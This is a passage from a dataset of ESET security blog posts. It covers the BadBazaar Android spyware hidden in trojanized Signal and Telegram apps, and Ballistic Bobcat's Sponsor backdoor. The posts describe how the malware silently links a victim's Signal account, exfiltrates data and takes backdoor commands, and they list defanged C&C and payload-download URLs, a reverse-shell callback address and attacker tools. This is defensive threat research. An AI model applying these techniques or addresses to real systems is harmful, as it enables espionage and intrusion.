Galaxy Store.\nGoogle took action and removed the app on May 23rd, 2023.\nFlyGram was taken down from Google Play sometime after January 6th, 2021.\nAt the time of writing, both apps are still available on the Samsung Galaxy Store.\nOverview The malicious Signal Plus Messenger app was initially uploaded to Google Play on July 7th, 2022, and it managed to get installed more than a hundred times.\nHowever, the Galaxy Store does not provide any information about the app’s initial upload date or the number of installations.\nIts presence on both platforms is depicted in Figure 1.\nBoth apps were created by the same developer, share the same malicious features, and the app descriptions on both stores refer to the same developer website, signalplus[.]org .\nThe domain was registered on February 15th, 2022, and provides a link to download the malicious Signal Plus Messenger application either from Google Play or directly from the website, as shown in Figure 2.\nRegardless of where the app is downloaded from – be it the Google Play version, the Samsung Galaxy Store version, or the website version – all three downloads result in obtaining a maliciously modified (or patched) version of the open-source Signal for Android app.\nThe malicious FlyGram app was initially uploaded to Google Play around June 4th, 2020, and it managed to garner more than 5,000 installations before being taken down sometime after January 6th, 2021.\nBoth FlyGram apps were signed using the identical code-signing certificate.\nMoreover, the same FlyGram app is also available for download from its dedicated website flygram[.]org .\nThis website was registered on April 6th, 2020, and provides a link to download the malicious FlyGram application directly from the website, as you can see in Figure 3.\nBased on code similarities, we can assign Signal Plus Messenger and FlyGram to the BadBazaar malware family, which has been previously used against Uyghurs and other Turkic ethnic minorities outside of China.\nBadBazaar was attributed to the China-aligned APT15 group by Lookout; below we explain why we limit attribution to the GREF group, and why we are currently unable to link GREF to APT15, but continue to monitor the situation.\nFurther details about the BadBazaar discovery timeline are available in Figure 4.\nVictimology Our telemetry reported detections on Android devices from Australia, Brazil, Denmark, the Democratic Republic of the Congo, Germany, Hong Kong, Hungary, Lithuania, the Netherlands, Poland, Portugal, Singapore, Spain, Ukraine, the United States, and Yemen.\nBased on our research, except for distribution from the official Google Play store and Samsung Galaxy Store, potential victims were also lured to install the FlyGram app from a Uyghur Telegram group focused on Android app sharing, which now has more than 1,300 members.\nOn July 26th, 2020, one of the group users posted a link to FlyGram at the Google Play store with a description to download a multilanguage Telegram app, as shown in Figure 6.\nThis might help to identify who targeted Uyghurs with the malicious FlyGram application.\nBased on available information on official app stores, we can’t tell who has been targeted by the campaign, since the apps were available for download without region restrictions.\nAttribution to GREF Specific malicious code found in Signal Plus Messenger and FlyGram belongs to the BadBazaar malware family, which Lookout attributed to APT15 in 2022.\nHowever, upon further inspection, that attribution was based on network infrastructure overlap with another Android malware family called DoubleAgent, which Lookout had previously documented in 2020.\nLookout linked DoubleAgent to XSLCmd, an OS X backdoor, which was documented and also connected to the GREF group by FireEye in 2014.\nWhile several sources claim that GREF is associated with APT15 (such as NCCGroup, Lookout, Malpedia), ESET researchers do not have enough evidence to support that connection and continue tracking GREF as a separate group.\nWe attribute the Signal Plus Messenger and FlyGram malicious apps to GREF with a high level of confidence, based on these indicators: - Significant code similarities between the Signal Plus Messenger and FlyGram samples, and the BadBazaar malware family, which Lookout attributes to the GREF cluster of APT15.\nTo the best of our knowledge, this malware family is unique to GREF. -\nOverlap in the targeting: the malicious FlyGram app used a Uyghur Telegram group as one of the distribution mechanisms.\nThis aligns with the targeting of other Android trojans previously used by GREF (BadBazaar, SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle).\nComparing the malicious code in a BadBazaar sample (SHA-1: E368DB837EDF340E47E85652D6159D6E90725B0D ) that Lookout discovered with that in Signal Plus Messenger and FlyGram, we see similar or the same unique class names and code that is responsible for user data exfiltration.\nThis is depicted in Figure 7 and Figure 8.\nSignal Plus Messenger and FlyGram also contain the same code as in BadBazaar to check whether the device operator is Chinese: see Figure 9.\nThis code is unique to the BadBazaar malware family.\nTechnical analysis Both Signal Plus Messenger and FlyGram are slightly different variants of BadBazaar that focus on user data exfiltration and espionage.\nHowever, it’s important to note that each of them possesses unique malicious functionalities.\nTo ensure clarity and avoid any confusion, we will analyze each variant separately.\nTrojanized Signal – Signal Plus Messenger app After initial app start, the user has to log into Signal Plus Messenger via legitimate Signal functionality, just like they would with the official Signal app for Android.\nOnce logged in, Signal Plus Messenger starts to communicate with its command and control (C&C) server, located at signalplus[.]org:4332 .\nDuring this communication, the app sends the server various device information, such as: IMEI number, phone number, MAC address, operator details, location data, Wi-Fi information, Signal PIN number that protects the account (if enabled by the user), emails for Google accounts, and contact list.\nThe server request is visible in Figure 10.\nLegitimate Signal apps provide a feature that allows users to link Signal Desktop and Signal iPad to their phones to communicate conveniently across multiple devices.\nTo properly link additional Signal devices to a smartphone, the user first needs to scan a QR code displayed on a device they wish to pair.\nAfter scanning, the user grants permission for the connection by tapping on the Link device button, as displayed in Figure 11.\nThe QR code contains a unique URI with a generated ID and key, ensuring secure and individualized linking for each new QR code.\nAn example of such URI is sgnl://linkdevice?uuid= .\nSignal Plus Messenger can spy on Signal messages by misusing the link device feature.\nIt does this by automatically connecting the compromised device to the attacker’s Signal device.\nThis method of spying is unique, as we haven’t seen this functionality being misused before by other malware, and this is the only method by which the attacker can obtain the content of Signal messages.\nBadBazaar, the malware responsible for the spying, bypasses the usual QR code scan and user click process by receiving the necessary URI from its C&C server, and directly triggering the necessary action when the Link device button is clicked.\nThis enables the malware to secretly link the victim’s smartphone to the attacker’s device, allowing them to spy on Signal communications without the victim’s knowledge, as illustrated in Figure 12.\nESET Research has informed Signal’s developers about this loophole.\nThe encrypted messaging service indicated that threat actors can alter the code of any messaging app and promote it in a deceptive or misleading manner.\nIn this case, if the official Signal clients were to display a notification whenever a new device is linked to the account, the fake version could simply disable that code path to bypass the warning and hide any maliciously linked devices.\nThe only way to prevent becoming a victim of a fake Signal – or any other malicious messaging app – is to download only official versions of such apps, only from official channels.\nDuring our research, the server hasn’t returned to the device a URI for linking, indicating this is most likely enabled only for specifically targeted users, based on the data previously sent by the malware to the C&C server.\nTo understand and replicate the behavior, we used the Frida instrumentation toolkit to simulate malicious behavior and autolinked our compromised Signal Android device (victim) to our Signal Desktop device (attacker), running on a laptop.\nThis linking process happened silently, without any interaction or notification to the user.\nTo ensure that a Signal account is not linked to another device, the user needs to go to Settings -> Linked devices .\nThis provides a way for users to detect any unauthorized linkages to their Signal account and take appropriate actions to secure their communications, as BadBazaar can’t hide an attacker-connected device from the Linked devices menu, as depicted in Figure 13.\nBadBazaar uses proxy servers that are received from the C&C server.\nThe malware can receive up to six different proxy servers, which refer to subdomains of the C&C server.\nAll proxy servers provided by Signal Plus Messenger are: proxy1.signalplus[.]org 154.202.59[.]169 proxy2.signalplus[.]org 92.118.189[.]164 proxy3.signalplus[.]org 45.154.12[.]151 proxy4.signalplus[.]org 45.154.12[.]202 proxy5.signalplus[.]org 103.27.186[.]195 proxy6.signalplus[.]org 103.27.186[.]156 The feature to use a proxy server by the app is not implemented by the attacker; instead, legitimate Signal proxy functionality is used but routed through the attacker’s server instead.\nAs a result, the attacker’s proxy server can possibly log some metadata, but can’t decrypt data and messages that are sent or received by Signal itself.\nTrojanized Telegram – FlyGram app After initial app launch, the user has to log into the FlyGram app via its legitimate Telegram functionality, as is necessary for the official Telegram app.\nBefore the login is complete, FlyGram starts to communicate with the C&C server located at flygram[.]org:4432 by sending basic device information such as: IMEI number, MAC address, operator name, device language, and time zone.\nBased on the server’s response, BadBazaar gains the ability to exfiltrate further sensitive information from the device, including: - contact list, - call logs, - list of installed apps, - list of Google accounts, - device location, and - Wi-Fi information (IP address, SSID, BSSID, MAC address, gateway, DNS, local network device scan discovery).\nFlyGram can also receive a URL from the C&C server to download an update; see Figure 14.\nThe downloaded update (flygram.apk ) is not dynamically loaded as an additional payload, but needs to be manually installed by the user.\nDuring our examination, we were unable to access the update file as the download link was no longer active.\nBadBazaar can exfiltrate internal Telegram files located in the /data/data/org.telegram.messenger/shared_prefs directory.\nThese files contain information and settings related to Telegram, such as the account token, the last called number, and the app language.\nHowever, they do not include the Telegram contact list, messages, or any other sensitive data.\nTo carry out the exfiltration process, BadBazaar compresses the content of this directory, excluding files with .jpg or .png extensions.\nThe compressed data is then stored in the file /data/data/org.telegram.\nFlyGram/cache/tgmcache/tgdata.rc .\nFinally, the malware sends this compressed file to the C&C server, as shown in Figure 15.\nThe BadBazaar actors took steps to protect their FlyGram app from being intercepted during network traffic analysis by malware analysts or automated sandbox tools that attempt to identify the C&C server and data exfiltration activities.\nThey achieved this protection through a technique called SSL pinning.\nSSL pinning is implemented in the org.telegram.\nApi.\nUtils.\nCertUtils class, as shown in Figure 16.\nThe certificate is stored in the resources directory of the APK file, specifically in the /res/raw/telemon_client.cer file using WMSvc-WIN-50QO3EIRQVP as the common name (CN).\nThis SSL pinning mechanism ensures that only encrypted communication with the predefined certificate is allowed, making it difficult for outsiders to intercept and analyze the network traffic between the FlyGram app and its C&C server.\nIn contrast, the Signal Plus Messenger app does not employ SSL pinning, which means it does not have this specific level of protection in place.\nOn top of its legitimate Telegram functionality, FlyGram developers implemented a Cloud Sync feature that allows the users to back up and restore Telegram contacts, profile pictures, groups, channels, etc. (\nsee Figure 17).\nTo use this feature, the user first needs to create an account.\nThe account is created using the attacker’s C&C server API (flygram[.]org:4432 ); once the account is set up, users can upload their backups to the attacker’s C&C server or retrieve their previous backups from there.\nDuring our in-depth examination of the Cloud Sync API, we made an interesting discovery.\nThe server provides a distinct ID for each newly created user account.\nThis ID is a unique value that increases sequentially (by one) with each new account.\nBy analyzing these ID values, we can estimate the number of users who have installed FlyGram and signed up for the Cloud Sync feature.\nAt the time of our analysis, our last test account was assigned the ID value 13,953 (see Figure 18), indicating that at that time 13,953 users (including us two times) had created accounts with the Cloud Sync feature enabled.\nFlyGram also uses proxy servers received from the C&C server; we observed these five proxy servers: 45.63.89[.]238:1011 45.133.238[.]92:6023 217.163.29[.]84:7011 185.239.227[.]14:3023 62.210.28[.]116:2011 To enable the proxy server functionality, the attackers didn’t implement it directly into the app.\nInstead, they utilized the legitimate Telegram functionality but rerouted it through their own servers.\nAs a result, the attacker’s proxy server may be able to log some metadata, but it cannot decrypt the actual data and messages exchanged within Telegram itself.\nUnlike Signal Plus Messenger, FlyGram lacks the ability to link a Telegram account to the attacker or intercept the encrypted communications of its victims.\nConclusion Two active Android campaigns operated by the GREF APT group distributed Android malware called BadBazaar via two apps, through the official Google Play store, and still distributes it via Samsung Galaxy Store, alternative app stores, and dedicated websites.\nA link to FlyGram in the Google Play store was also shared in a Uyghur Telegram group.\nMalicious code from the BadBazaar family was hidden in trojanized Signal and Telegram apps, which should provide victims a working app experience (without reason to remove it) but with espionage happening in the background.\nBadBazaar’s main purpose is to exfiltrate device information, the contact list, call logs, and the list of installed apps, and to conduct espionage on Signal messages by secretly linking the victim’s Signal Plus Messenger app to the attacker’s device.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Package name | ESET detection name | Description | | | | Android/Spy.\nBadBazaar.\nA | BadBazaar malware.\n| | | | Android/Spy.\nBadBazaar.\nA | BadBazaar malware from Google Play store.\n| | | | Android/Spy.\nBadBazaar.\nA | BadBazaar malware from Samsung Galaxy Store.\n| | | | Android/Spy.\nBadBazaar.\nA | BadBazaar malware from distribution website and Samsung Galaxy Store.\n| | | | Android/Spy.\nBadBazaar.\nA | BadBazaar malware from Google Play store.\n| Network | IP | Domain | Hosting provider | First seen | Details | | | | The Constant Company, LLC | 2020-01-04 | FlyGram proxy server.\n| | | | XNNET LLC | 2020-11-26 | FlyGram proxy server.\n| | | | MOACK.Co.\nLTD | 2022-06-13 | C&C server.\n| | | | MOACK.Co.\nLTD | 2021-02-02 | Signal Plus proxy server.\n| | | | MOACK.Co.\nLTD | 2020-12-14 | Signal Plus proxy server.\n| | | | SCALEWAY S.A.S. | 2020-03-08 | FlyGram proxy server.\n| | | | Hostinger International Limited | 2022-10-26 | Distribution website.\n| | | | CNSERVERS LLC | N/A | Signal Plus proxy server.\n| | | | Starry Network Limited | 2022-06-13 | Signal Plus proxy server.\n| | | | Starry Network Limited | 2021-12-21 | Signal Plus proxy server.\n| | | | Hetzner Online GmbH - Contact Role, ORG-HOA1-RIPE | 2020-09-10 | C&C server.\n| | | | CNSERVERS LLC | 2022-06-13 | Signal Plus proxy server.\n| | | | Hostinger International Limited | 2021-06-04 | Distribution website.\n| | | N/A | Starry Network Limited | N/A | FlyGram proxy server.\n| | | N/A | Abuse-C Role | N/A | FlyGram proxy server.\n| MITRE ATT&CK techniques This table was built using version 13 of the MITRE ATT&CK framework.","num_sentences":163,"metadata":{"source":"blog","platform":"welivesecurity","filename":"badbazaar"}}
{"id":206,"title":"Sponsor with batch-filed whiskers: Ballistic Bobcat’s scan and strike backdoor","publish_date":"2023-09-11","link":"https://www.welivesecurity.com/en/eset-research/sponsor-batch-filed-whiskers-ballistic-bobcats-scan-strike-backdoor/","clean_text":"ESET researchers discovered a Ballistic Bobcat campaign targeting various entities in Brazil, Israel, and the United Arab Emirates, using a novel backdoor we have named Sponsor.\nWe discovered Sponsor after we analyzed an interesting sample we detected on a victim’s system in Israel in May 2022 and scoped the victim-set by country.\nUpon examination, it became evident to us that the sample was a novel backdoor deployed by the Ballistic Bobcat APT group.\nBallistic Bobcat, previously tracked by ESET Research as APT35/APT42 (aka Charming Kitten, TA453, or PHOSPHORUS), is a suspected Iran-aligned advanced persistent threat group that targets education, government, and healthcare organizations, as well as human rights activists and journalists.\nIt is most active in Israel, the Middle East, and the United States.\nNotably, during the pandemic, it was targeting COVID-19-related organizations, including the World Health Organization and Gilead Pharmaceuticals, and medical research personnel.\nOverlaps between Ballistic Bobcat campaigns and Sponsor backdoor versions show a fairly clear pattern of tool development and deployment, with narrowly targeted campaigns, each of limited duration.\nWe subsequently discovered four other versions of the Sponsor backdoor.\nIn total, we saw Sponsor deployed to at least 34 victims in Brazil, Israel, and the United Arab Emirates, as outlined in Figure 1.\nKey points of this blogpost: - We discovered a new backdoor deployed by Ballistic Bobcat that we subsequently named Sponsor. -\nBallistic Bobcat deployed the new backdoor in September 2021, while it was wrapping up the campaign documented in CISA Alert AA21-321A and the PowerLess campaign. -\nThe Sponsor backdoor uses configuration files stored on disk.\nThese files are discreetly deployed by batch files and deliberately designed to appear innocuous, thereby attempting to evade detection by scanning engines. -\nSponsor was deployed to at least 34 victims in Brazil, Israel, and the United Arab Emirates; we have named this activity the Sponsoring Access campaign.\nInitial access Ballistic Bobcat obtained initial access by exploiting known vulnerabilities in internet-exposed Microsoft Exchange servers by first conducting meticulous scans of the system or network to identify potential weaknesses or vulnerabilities, and subsequently targeting and exploiting those identified weaknesses.\nThe group has been known to engage in this behavior for some time.\nHowever, many of the 34 victims identified in ESET telemetry might best be described as victims of opportunity rather than preselected and researched victims, as we suspect Ballistic Bobcat engaged in the above-described scan-and-exploit behavior because it was not the only threat actor with access to these systems.\nWe have named this Ballistic Bobcat activity utilizing the Sponsor backdoor the Sponsoring Access campaign.\nThe Sponsor backdoor uses configuration files on disk, dropped by batch files, and both are innocuous so as to bypass scanning engines.\nThis modular approach is one that Ballistic Bobcat has used quite often and with modest success in the past two and a half years.\nOn compromised systems, Ballistic Bobcat also continues to use a variety of open-source tools, which we describe – together with the Sponsor backdoor – in this blogpost.\nVictimology A significant majority of the 34 victims were located in Israel, with only two located in other countries: - Brazil, at a medical cooperative and health insurance operator, and - the United Arab Emirates, at an unidentified organization.\nTable 1 describes the verticals, and organizational details, for victims in Israel.\nTable 1.\nVerticals and organizational details for victims in Israel | Vertical | Details | | Automotive | · An automotive company specializing in custom modifications. ·\nAn automotive repair and maintenance company.\n| | Communications | · An Israeli media outlet.\n| | Engineering | · A civil engineering firm. ·\nAn environmental engineering firm. ·\nAn architectural design firm.\n| | Financial services | · A financial services company that specializes in investment counseling. ·\nA company that manages royalties.\n| | Healthcare | · A medical care provider.\n| | Insurance | · An insurance company that operates an insurance marketplace. ·\nA commercial insurance company.\n| | Law | · A firm specializing in medical law.\n| | Manufacturing | · Multiple electronics manufacturing companies. ·\nA company that manufactures metal-based commercial products. ·\nA multinational technology manufacturing company.\n| | Retail | · A food retailer. ·\nA multinational diamond retailer. ·\nA skin care products retailer. ·\nA window treatment retailer and installer. ·\nA global electronic parts supplier. ·\nA physical access control supplier.\n| | Technology | · An IT services technology company. ·\nAn IT solutions provider.\n| | Telecommunications | · A telecommunications company.\n| | Unidentified | · Multiple unidentified organizations.\n| Attribution In August 2021, the Israeli victim above that operates an insurance marketplace was attacked by Ballistic Bobcat with the tools CISA reported in November 2021.\nThe indicators of compromise we observed are: - MicrosoftOutlookUpdateSchedule, - MicrosoftOutlookUpdateSchedule.xml, - GoogleChangeManagement, and - GoogleChangeManagement.xml.\nBallistic Bobcat tools communicated with the same command and control (C&C) server as in the CISA report: 162.55.137[.]20.\nThen, in September 2021, the same victim received the next generation of Ballistic Bobcat tools: the PowerLess backdoor and its supporting toolset.\nThe indicators of compromise we observed were: - http://162.55.137[.]20/gsdhdDdfgA5sS/ff/dll.dll, - windowsprocesses.exe, and - http://162.55.137[.]20/gsdhdDdfgA5sS/ff/windowsprocesses.exe.\nOn November 18th, 2021, the group then deployed another tool (Plink) that was covered in the CISA report, as MicrosoftOutLookUpdater.exe.\nTen days later, on November 28th, 2021, Ballistic Bobcat deployed the Merlin agent (the agent portion of an open-source post-exploitation C&C server and agent written in Go).\nOn disk, this Merlin agent was named googleUpdate.exe, using the same naming convention as described in the CISA report to hide in plain sight.\nThe Merlin agent executed a Meterpreter reverse shell that called back to a new C&C server, 37.120.222[.]168:80.\nOn December 12th, 2021, the reverse shell dropped a batch file, install.bat, and within minutes of executing the batch file, Ballistic Bobcat operators pushed their newest backdoor, Sponsor.\nThis would turn out to be the third version of the backdoor.\nTechnical analysis Initial access We were able to identify a likely means of initial access for 23 of the 34 victims that we observed in ESET telemetry.\nSimilar to what was reported in the PowerLess and CISA reports, Ballistic Bobcat probably exploited a known vulnerability, CVE-2021-26855, in Microsoft Exchange servers to gain a foothold on these systems.\nFor 16 of the 34 victims, it appears Ballistic Bobcat was not the only threat actor with access to their systems.\nThis may indicate, along with the wide variety of victims and the apparent lack of obvious intelligence value of a few victims, that Ballistic Bobcat engaged in scan-and-exploit behavior, as opposed to a targeted campaign against preselected victims.\nToolset Open-source tools Ballistic Bobcat employed a number of open-source tools during the Sponsoring Access campaign.\nThose tools and their functions are listed in Table 2.\nTable 2.\nOpen-source tools used by Ballistic Bobcat | Filename | Description | host2ip.exe | Maps a hostname to an IP address within the local network.\n| CSRSS.EXE | RevSocks, a reverse tunnel application.\n| mi.exe | Mimikatz, with an original filename of midongle.exe and packed with the Armadillo PE packer.\n| gost.exe | GO Simple Tunnel (GOST), a tunneling application written in Go.\n| chisel.exe | Chisel, a TCP/UDP tunnel over HTTP using SSH layers.\n| csrss_protected.exe | RevSocks tunnel, protected with the trial version of the Enigma Protector software protection.\n| plink.exe | Plink (PuTTY Link), a command line connection tool.\n| | WebBrowserPassView.exe | A password recovery tool for passwords stored in web browsers.\n| sqlextractor.exe | A tool for interacting with, and extracting data from, SQL databases.\n| procdump64.exe | ProcDump, a Sysinternals command line utility for monitoring applications and generating crash dumps.\n| Batch files Ballistic Bobcat deployed batch files to victims’ systems moments before deploying the Sponsor backdoor.\nFile paths we are aware of are: - C:\\inetpub\\wwwroot\\aspnet_client\\Install.bat - %USERPROFILE%\\Desktop\\Install.bat - %WINDOWS%\\Tasks\\Install.bat Unfortunately, we were unable to obtain any of these batch files.\nHowever, we believe they write innocuous configuration files to disk, which the Sponsor backdoor requires to function fully.\nThese configuration filenames were taken from the Sponsor backdoors but were never collected: - config.txt - node.txt - error.txt - Uninstall.bat We believe that the batch files and configuration files are part of the modular development process that Ballistic Bobcat has favored over the past few years.\nSponsor backdoor Sponsor backdoors are written in C++ with compilation timestamps and Program Database (PDB) paths as shown in Table 3.\nA note on version numbers: the column Version represents the version that we track internally based on the linear progression of Sponsor backdoors where changes are made from one version to the next.\nThe Internal version column contains the version numbers observed in each Sponsor backdoor and are included for ease of comparison when examining these and other potential Sponsor samples.\nTable 3.\nSponsor compilation timestamps and PDBs | Version | Internal version | Compilation timestamp | PDB | | 1 | 1.0.0 | 2021-08-29 09:12:51 | D:\\Temp\\BD_Plus_Srvc\\Release\\BD_Plus_Srvc.pdb | | 2 | 1.0.0 | 2021-10-09 12:39:15 | D:\\Temp\\Sponsor\\Release\\Sponsor.pdb | | 3 | 1.4.0 | 2021-11-24 11:51:55 | D:\\Temp\\Sponsor\\Release\\Sponsor.pdb | | 4 | 2.1.1 | 2022-02-19 13:12:07 | D:\\Temp\\Sponsor\\Release\\Sponsor.pdb | | 5 | 1.2.3.0 | 2022-06-19 14:14:13 | D:\\Temp\\Alumina\\Release\\Alumina.pdb | The initial execution of Sponsor requires the runtime argument install, without which Sponsor gracefully exits, likely a simple anti-emulation/anti-sandbox technique.\nIf passed that argument, Sponsor creates a service called SystemNetwork (in v1) and Update (in all the other versions).\nIt sets the service’s Startup Type to Automatic, and sets it to run its own Sponsor process, and grants it full access.\nIt then starts the service.\nSponsor, now running as a service, attempts to open the aforementioned configuration files previously placed on disk.\nIt looks for config.txt and node.txt, both in the current working directory.\nIf the first is missing, Sponsor sets the service to Stopped and gracefully exits.\nBackdoor configuration Sponsor’s configuration, stored in config.txt, contains two fields: - An update interval, in seconds, to periodically contact the C&C server for commands. -\nA list of C&C servers, referred to as relays in Sponsor’s binaries.\nThe C&C servers are stored encrypted (RC4), and the decryption key is present in the first line of config.txt.\nEach of the fields, including the decryption key, have the format shown in Figure 3.\nThese subfields are: - config_start: indicates the length of config_name, if present, or zero, if not.\nUsed by the backdoor to know where config_data starts. -\nconfig_len: length of config_data. -\nconfig_name: optional, contains a name given to the configuration field. -\nconfig_data: the configuration itself, encrypted (in the case of C&C servers) or not (all the other fields).\nFigure 4 shows an example with color-coded contents of a possible config.txt file.\nNote that this is not an actual file we observed, but a fabricated example.\nThe last two fields in config.txt are encrypted with RC4, using the string representation of the SHA-256 hash of the specified decryption key, as the key to encrypt the data.\nWe see that the encrypted bytes are stored hex-encoded as ASCII text.\nHost information gathering Sponsor gathers information about the host on which it is running, reports all of the gathered information to the C&C server, and receives a node ID, which is written to node.txt.\nTable 4 lists keys and values in the Windows registry that Sponsor uses to get the information, and provides an example of the data collected.\nTable 4.\nInformation gathered by Sponsor | Registry key | Value | Example | HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters | Hostname | D-835MK12 | HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation | TimeZoneKeyName | Israel Standard Time | HKEY_USERS\\.DEFAULT\\Control Panel\\International | LocaleName | he-IL | HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS | BaseBoardProduct | 10NX0010IL | HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 | ProcessorNameString | Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz | HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion | ProductName | Windows 10 Enterprise N | CurrentVersion | 6.3 | | CurrentBuildNumber | 19044 | | InstallationType | Client | Sponsor also collects the host’s Windows domain by using the following WMIC command: wmic computersystem get domain Lastly, Sponsor uses Windows APIs to collect the current username (GetUserNameW), determine if the current Sponsor process is running as a 32- or 64-bit application (GetCurrentProcess, then IsWow64Process(CurrentProcess)), and determines whether the system is running on battery power or connected to an AC or DC power source (GetSystemPowerStatus).\nOne oddity regarding the 32- or 64-bit application check is that all observed samples of Sponsor were 32-bit.\nThis could mean that some of the next stage tools require this information.\nThe collected information is sent in a base64-encoded message that, before encoding, starts with r and has the format shown in Figure 5.\nThe information is encrypted with RC4, and the encryption key is a random number generated on the spot.\nThe key is hashed with the MD5 algorithm, not SHA-256 as previously mentioned.\nThis is the case for all communications where Sponsor has to send encrypted data.\nThe C&C server replies with a number used to identify the victimized computer in later communications, which is written to node.txt.\nNote that the C&C server is randomly chosen from the list when the r message is sent, and the same server is used in all subsequent communications.\nCommand processing loop Sponsor requests commands in a loop, sleeping according to the interval defined in config.txt.\nThe steps are: - Send a chk=Test message repeatedly, until the C&C server replies Ok. -\nSend a c (IS_CMD_AVAIL) message to the C&C server, and receive an operator command. -\nProcess the command. -\nIf there is output to be sent to the C&C server, send an a (ACK) message, including the output (encrypted), or - If execution failed, send an f ( FAILED) message.\nThe error message is not sent. -\nSleep.\nThe c message is sent to request a command to execute, and has the format (before base64 encoding) shown in Figure 6.\nThe encrypted_none field in the figure is the result of encrypting the hardcoded string None with RC4.\nThe key for encryption is the MD5 hash of node_id.\nThe URL used to contact the C&C server is built as: http:// Operator commands Operator commands are delineated in Table 5 and appear in the order in which they are found in the code.\nCommunication with the C&C server occurs over port 80.\nTable 5.\nOperator commands and descriptions | Command | Description | | p | Sends the process ID for the running Sponsor process.\n| | e | Executes a command, as specified in a subsequent additional argument, on the Sponsor host using the following string: c:\\windows\\system32\\cmd.exe /c Results are stored in result.txt in the current working directory.\nSends an a message with the encrypted output to the C&C server if successfully executed.\nIf failed, sends an f message (without specifying the error).\n| | d | Receives a file from the C&C server and executes it.\nThis command has many arguments: the target filename to write the file into, the MD5 hash of the file, a directory to write the file to (or the current working directory, by default), a Boolean to indicate whether to run the file or not, and the contents of the executable file, base64-encoded.\nIf no errors occur, an a message is sent to the C&C server with Upload and execute file successfully or Upload file successfully without execute (encrypted).\nIf errors occur during execution of the file, an f message is sent.\nIf the MD5 hash of the contents of the file does not match the provided hash, an e (CRC_ERROR) message is sent to the C&C server (including only the encryption key used, and no other information).\nThe use of the term Upload here is potentially confusing as the Ballistic Bobcat operators and coders take the point of view from the server side, whereas many might view this as a download based on the pulling of the file (i.e., downloading it) by the system using the Sponsor backdoor.\n| | u | Attempts to download a file using the URLDownloadFileW Windows API and execute it.\nSuccess sends an a message with the encryption key used, and no other information.\nFailure sends an f message with a similar structure.\n| | s | Executes a file already on disk, Uninstall.bat in the current working directory, that most likely contains commands to delete files related to the backdoor.\n| | n | This command can be explicitly supplied by an operator or can be inferred by Sponsor as the command to execute in the absence of any other command.\nReferred to within Sponsor as NO_CMD, it executes a randomized sleep before checking back in with the C&C server.\n| | b | Updates the list of C&Cs stored in config.txt in the current working directory.\nThe new C&C addresses replace the previous ones; they are not added to the list.\nIt sends an a message with | | i | Updates the predetermined check-in interval specified in config.txt.\nIt sends an a message with New interval replaced successfully to the C&C server if successfully updated.\n| Updates to Sponsor Ballistic Bobcat coders made code revisions between Sponsor v1 and v2.\nThe two most significant changes in the latter are: - Optimization of code where several longer functions were minimized into functions and subfunctions, and - Disguising Sponsor as an updater program by including the following message in the service configuration: App updates are great for both app users and apps – updates mean that developers are always working on improving the app, keeping in mind a better customer experience with each update.\nNetwork infrastructure In addition to piggybacking on the C&C infrastructure used in the PowerLess campaign, Ballistic Bobcat also introduced a new C&C server.\nThe group also utilized multiple IPs to store and deliver support tools during the Sponsoring Access campaign.\nWe have confirmed that none of these IPs are in operation at this time.\nConclusion Ballistic Bobcat continues to operate on a scan-and-exploit model, looking for targets of opportunity with unpatched vulnerabilities in internet-exposed Microsoft Exchange servers.\nThe group continues to use a diverse open-source toolset supplemented with several custom applications, including its Sponsor backdoor.\nDefenders would be well advised to patch any internet-exposed devices and remain vigilant for new applications popping up within their organizations.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | Detection | Description | 098B9A6CE722311553E1D8AC5849BA1DC5834C52 | N/A | Win32/Agent.\nUXG | Ballistic Bobcat backdoor, Sponsor (v1).\n| 5AEE3C957056A8640041ABC108D0B8A3D7A02EBD | N/A | Win32/Agent.\nUXG | Ballistic Bobcat backdoor, Sponsor (v2).\n| 764EB6CA3752576C182FC19CFF3E86C38DD51475 | N/A | Win32/Agent.\nUXG | Ballistic Bobcat backdoor, Sponsor (v3).\n| 2F3EDA9D788A35F4C467B63860E73C3B010529CC | N/A | Win32/Agent.\nUXG | Ballistic Bobcat backdoor, Sponsor (v4).\n| E443DC53284537513C00818392E569C79328F56F | N/A | Win32/Agent.\nUXG | Ballistic Bobcat backdoor, Sponsor (v5, aka Alumina).\n| C4BC1A5A02F8AC3CF642880DC1FC3B1E46E4DA61 | N/A | WinGo/Agent.\nBT | RevSocks reverse tunnel.\n| 39AE8BA8C5280A09BA638DF4C9D64AC0F3F706B6 | N/A | clean | ProcDump, a command line utility for monitoring applications and generating crash dumps.\n| A200BE662CDC0ECE2A2C8FC4DBBC8C574D31848A | N/A | Generik.\nEYWYQYF | Mimikatz.\n| 5D60C8507AC9B840A13FFDF19E3315A3E14DE66A | N/A | WinGo/Riskware.\nGost.\nD | GO Simple Tunnel (GOST).\n| 50CFB3CF1A0FE5EC2264ACE53F96FADFE99CC617 | N/A | WinGo/HackTool.\nChisel.\nA | Chisel reverse tunnel.\n| 1AAE62ACEE3C04A6728F9EDC3756FABD6E342252 | N/A | N/A | Host2IP discovery tool.\n| 519CA93366F1B1D71052C6CE140F5C80CE885181 | N/A | Win64/Packed.\nEnigma.\nBV | RevSocks tunnel, protected with the trial version of the Enigma Protector software protection.\n| 4709827C7A95012AB970BF651ED5183083366C79 | N/A | N/A | Plink (PuTTY Link), a command line connection tool.\n| 99C7B5827DF89B4FAFC2B565ABED97C58A3C65B8 | N/A | Win32/PSWTool.\nWebBrowserPassView.\nI | A password recovery tool for passwords stored in web browsers.\n| E52AA118A59502790A4DD6625854BD93C0DEAF27 | N/A | MSIL/HackTool.\nSQLDump.\nA | A tool for interacting with, and extracting data from, SQL databases.\n| File paths The following is a list of paths where the Sponsor backdoor was deployed on victimized machines. 